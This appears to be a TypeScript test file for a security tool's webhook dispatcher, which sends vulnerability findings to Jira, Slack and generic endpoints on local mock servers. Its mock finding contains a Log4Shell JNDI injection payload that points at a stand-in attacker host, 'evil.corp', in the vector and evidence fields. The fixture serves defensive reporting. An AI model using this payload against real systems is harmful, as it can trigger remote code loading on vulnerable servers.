import { describe, expect, test } from "bun:test"
import { Effect } from "effect"
import { dispatchFindingsWebhook } from "@argos/core/security/webhook"
import type { FindingTable } from "@argos/core/security/sql"

type FindingRow = typeof FindingTable.$inferSelect

const mockFinding: FindingRow = {
  id: "finding_123",
  session_id: "ses_123" as any,
  project_id: "prj_123" as any,
  case_id: null,
  fingerprint: "fp_123",
  title: "Remote Code Execution via Log4j",
  severity: "critical",
  status: "open",
  source: "network.scan",
  source_tool: "nuclei",
  agent: "pentest-agent",
  target: "https://vuln.target.corp",
  cwe: "CWE-94",
  vector: "${jndi:ldap://evil.corp/a}",
  poc: null,
  evidence: { payload: "${jndi:ldap://evil.corp/a}", status: 200 },
  remediation: "Upgrade log4j to 2.17.1 or higher",
  tags: ["cwe-94", "log4shell"],
  confidence: "confirmed",
  rule_id: "nuclei:log4j-rce",
  owasp: ["A03:2021"],
  references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
  raw: "{}",
  attack_techniques: null,
  iocs: null,
  cvss_input: null,
  enrichment: null,
  enriched_at: null,
  validation_status: "confirmed",
  validation_evidence: null,
  validated_at: null,
  time_created: 1700000000000,
  time_updated: 1700000000000,
}

describe("dispatchFindingsWebhook", () => {
  test("dispatches Jira format with default project key 'SEC'", async () => {
    let capturedBody: any
    let capturedHeaders: Headers | undefined
    const server = Bun.serve({
      port: 0,
      fetch(req) {
        capturedHeaders = req.headers
        return req.json().then((json) => {
          capturedBody = json
          return new Response(JSON.stringify({ success: true }), { status: 201 })
        })
      },
    })

    try {
      const effect = dispatchFindingsWebhook([mockFinding], {
        url: `http://localhost:${server.port}/jira-webhook`,
        format: "jira",
      })
      const result = await Effect.runPromise(effect)

      expect(result.ok).toBe(true)
      expect(result.statusCode).toBe(201)
      expect(result.dispatchedCount).toBe(1)
      expect(capturedBody.issues).toBeDefined()
      expect(capturedBody.issues[0].fields.project.key).toBe("SEC")
      expect(capturedBody.issues[0].fields.summary).toBe("[Argos][CRITICAL] Remote Code Execution via Log4j")
      expect(capturedBody.issues[0].fields.issuetype.name).toBe("Bug")
      expect(capturedBody.issues[0].fields.priority.name).toBe("Highest")
    } finally {
      server.stop(true)
    }
  })

  test("dispatches Jira format with custom project key", async () => {
    let capturedBody: any
    const server = Bun.serve({
      port: 0,
      fetch(req) {
        return req.json().then((json) => {
          capturedBody = json
          return new Response(JSON.stringify({ id: "PROJ-1" }), { status: 200 })
        })
      },
    })

    try {
      const effect = dispatchFindingsWebhook([mockFinding], {
        url: `http://localhost:${server.port}/jira-webhook`,
        format: "jira",
        jiraProjectKey: "AUDIT",
      })
      const result = await Effect.runPromise(effect)

      expect(result.ok).toBe(true)
      expect(capturedBody.issues[0].fields.project.key).toBe("AUDIT")
    } finally {
      server.stop(true)
    }
  })

  test("dispatches Slack format with block summary and details", async () => {
    let capturedBody: any
    const server = Bun.serve({
      port: 0,
      fetch(req) {
        return req.json().then((json) => {
          capturedBody = json
          return new Response("ok", { status: 200 })
        })
      },
    })

    try {
      const effect = dispatchFindingsWebhook([mockFinding], {
        url: `http://localhost:${server.port}/slack-webhook`,
        format: "slack",
      })
      const result = await Effect.runPromise(effect)

      expect(result.ok).toBe(true)
      expect(capturedBody.text).toContain("Argos Security Alert")
      expect(capturedBody.blocks.length).toBeGreaterThan(1)
    } finally {
      server.stop(true)
    }
  })

  test("dispatches Generic format and sends the X-Argos-Secret header", async () => {
    let capturedHeaders: Headers | undefined
    let capturedBody: any
    const server = Bun.serve({
      port: 0,
      fetch(req) {
        capturedHeaders = req.headers
        return req.json().then((json) => {
          capturedBody = json
          return new Response("received", { status: 200 })
        })
      },
    })

    try {
      const effect = dispatchFindingsWebhook([mockFinding], {
        url: `http://localhost:${server.port}/generic-webhook`,
        format: "generic",
        secret: "my-webhook-secret-token",
      })
      const result = await Effect.runPromise(effect)

      expect(result.ok).toBe(true)
      expect(capturedHeaders?.get("x-argos-secret")).toBe("my-webhook-secret-token")
      expect(capturedBody.event).toBe("argos.findings.dispatched")
      expect(capturedBody.count).toBe(1)
      expect(capturedBody.findings[0].title).toBe("Remote Code Execution via Log4j")
    } finally {
      server.stop(true)
    }
  })

  test("handles connection failure gracefully returning ok: false without crashing", async () => {
    // Port 1 is reserved and closed
    const effect = dispatchFindingsWebhook([mockFinding], {
      url: "http://127.0.0.1:1/invalid-port",
      timeoutMs: 500,
    })
    const result = await Effect.runPromise(effect)

    expect(result.ok).toBe(false)
    expect(result.statusCode).toBe(0)
    expect(result.dispatchedCount).toBe(1)
    expect(result.responseBody).toBeDefined()
  })
})
